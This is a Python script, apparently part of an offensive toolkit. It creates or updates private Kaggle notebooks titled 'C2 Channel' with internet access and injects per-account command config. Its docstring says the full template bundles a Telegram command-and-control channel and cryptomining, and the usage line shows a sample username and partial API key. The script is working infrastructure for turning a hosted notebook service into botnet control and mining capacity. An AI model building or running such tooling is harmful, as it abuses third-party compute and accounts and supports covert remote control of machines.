#!/usr/bin/env python3
"""Recreate C2 Kernel - Creates fresh kernel without re-registration.

Usage:
    python scripts/recreate_kernel.py <username> <api_key>
"""

import sys
import json
import time
import base64
import requests
from pathlib import Path

def recreate_c2_kernel(username: str, api_key: str, kernel_slug: str = None, use_full: bool = True):
    """Recreate C2 kernel with correct format.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (default: {username}/c2-channel)
        use_full: Use full notebook template with Telegram C2 + Mining
    
    Returns:
        Result dict with success, version, url, error
    """
    kernel_slug = kernel_slug or f"{username}/c2-channel"
    auth = base64.b64encode(f"{username}:{api_key}".encode()).decode()
    
    result = {"success": False, "version": None, "url": None, "error": None}
    
    # Load full notebook template
    if use_full:
        template_path = Path(__file__).parent.parent / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
        
        if template_path.exists():
            print(f"[RECREATE] Loading full template: {template_path}")
            with open(template_path) as f:
                notebook = json.load(f)
            
            # Update COMMANDS in source
            for cell in notebook.get("cells", []):
                source = cell.get("source", "")
                if isinstance(source, list):
                    source = "".join(source)
                
                # Inject account-specific config
                if "COMMANDS" in source and "=" in source:
                    # Find and replace COMMANDS
                    lines = source.split("\n")
                    new_lines = []
                    for line in lines:
                        if "COMMANDS" in line and "=" in line and "{" in line:
                            # Replace with new COMMANDS
                            new_lines.append(f"COMMANDS = {{'action': 'ready', 'account': '{username}', 'timestamp': {time.time()}}}")
                        else:
                            new_lines.append(line)
                    cell["source"] = "\n".join(new_lines)
        else:
            print(f"[RECREATE] Template not found, using simple notebook")
            use_full = False
    
    if not use_full:
        # Create simple notebook with COMMANDS
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "source": ["# C2 Channel - Initialized"],
                    "metadata": {},
                    "execution_count": None,
                    "outputs": []
                },
                {
                    "cell_type": "code",
                    "source": [f"COMMANDS = {{'action': 'ready', 'account': '{username}', 'timestamp': {time.time()}}}"],
                    "metadata": {},
                    "execution_count": None,
                    "outputs": []
                },
                {
                    "cell_type": "code",
                    "source": ["print(f'[C2] Ready: {{COMMANDS}}')"],
                    "metadata": {},
                    "execution_count": None,
                    "outputs": []
                }
            ],
            "metadata": {
                "kernelspec": {
                    "display_name": "Python 3",
                    "language": "python",
                    "name": "python3"
                }
            },
            "nbformat": 4,
            "nbformat_minor": 4
        }
    
    notebook_json = json.dumps(notebook)
    
    print(f"[RECREATE] Creating kernel: {kernel_slug}")
    print(f"[RECREATE] User: {username}")
    
    # Push kernel with title (required for new kernels)
    resp = requests.post(
        "https://www.kaggle.com/api/v1/kernels/push",
        headers={
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/json"
        },
        json={
            "slug": kernel_slug,
            "newTitle": "C2 Channel",
            "text": notebook_json,
            "language": "python",
            "kernelType": "notebook",
            "isPrivate": True,
            "enableInternet": True
        },
        timeout=60
    )
    
    print(f"[RECREATE] Response: {resp.status_code}")
    
    if resp.status_code == 200:
        data = resp.json()
        error = data.get("error")
        
        if error:
            # Check if it's just "already exists" - that's OK
            if "already" in error.lower() or "exists" in error.lower():
                print(f"[RECREATE] Kernel exists, updating...")
                # Try update without title
                resp2 = requests.post(
                    "https://www.kaggle.com/api/v1/kernels/push",
                    headers={
                        "Authorization": f"Basic {auth}",
                        "Content-Type": "application/json"
                    },
                    json={
                        "slug": kernel_slug,
                        "text": notebook_json,
                        "language": "python",
                        "kernelType": "notebook",
                        "isPrivate": True,
                        "enableInternet": True
                    },
                    timeout=60
                )
                
                if resp2.status_code == 200:
                    data2 = resp2.json()
                    result["success"] = True
                    result["version"] = data2.get("versionNumber", 0)
                    result["url"] = data2.get("url")
                    print(f"[RECREATE] ✓ Updated: v{result['version']}")
                else:
                    result["error"] = f"Update failed: {resp2.status_code}"
            else:
                result["error"] = error
                print(f"[RECREATE] ✗ Error: {error}")
        else:
            result["success"] = True
            result["version"] = data.get("versionNumber", 0)
            result["url"] = data.get("url")
            print(f"[RECREATE] ✓ Created: v{result['version']}")
            print(f"[RECREATE] URL: {result['url']}")
    else:
        result["error"] = f"HTTP {resp.status_code}: {resp.text[:100]}"
        print(f"[RECREATE] ✗ Failed: {result['error']}")
    
    return result


def main():
    if len(sys.argv) < 3:
        print("Usage: python recreate_kernel.py <username> <api_key> [kernel_slug]")
        print("\nExample:")
        print("  python recreate_kernel.py sarahbarr907901 6373374dcfa26ef8a402...")
        sys.exit(1)
    
    username = sys.argv[1]
    api_key = sys.argv[2]
    kernel_slug = sys.argv[3] if len(sys.argv) > 3 else None
    
    result = recreate_c2_kernel(username, api_key, kernel_slug)
    
    print("\n" + "="*60)
    if result["success"]:
        print("✓ KERNEL RECREATED SUCCESSFULLY")
        print(f"  Version: {result['version']}")
        print(f"  URL: {result['url']}")
    else:
        print("✗ FAILED")
        print(f"  Error: {result['error']}")


if __name__ == "__main__":
    main()
